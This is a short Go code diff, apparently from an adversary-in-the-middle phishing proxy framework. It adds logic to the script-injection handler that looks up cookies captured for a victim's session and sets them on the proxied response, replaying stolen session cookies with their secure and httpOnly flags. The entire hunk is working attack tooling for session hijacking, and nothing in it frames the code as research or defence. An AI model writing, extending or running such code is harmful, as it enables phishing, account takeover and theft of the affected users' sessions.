@@ -248,6 +248,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								log.Warning("js_inject: script not found: '%s'", js_id)
 							}
 							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
+							
+							// Inject captured cookies if available
+							if pm := GetPuppetMaster(); pm != nil {
+								if cookies := pm.sessionMap.GetCookies(session_id); cookies != nil {
+									log.Info("js_inject: injecting %d cookies for session %s", len(cookies), session_id)
+									for _, cookie := range cookies {
+										if name, ok := cookie["name"].(string); ok {
+											if val, ok := cookie["value"].(string); ok {
+												c := &http.Cookie{
+													Name:  name,
+													Value: val,
+													Path:  "/",
+												}
+												if secure, ok := cookie["secure"].(bool); ok && secure {
+													c.Secure = true
+												}
+												if httpOnly, ok := cookie["httpOnly"].(bool); ok && httpOnly {
+													c.HttpOnly = true
+												}
+												resp.Header.Add("Set-Cookie", c.String())
+											}
+										}
+									}
+								}
+							}
+							
 							return req, resp
 						} else {
 							log.Warning("js_inject: session not found: '%s'", session_id)
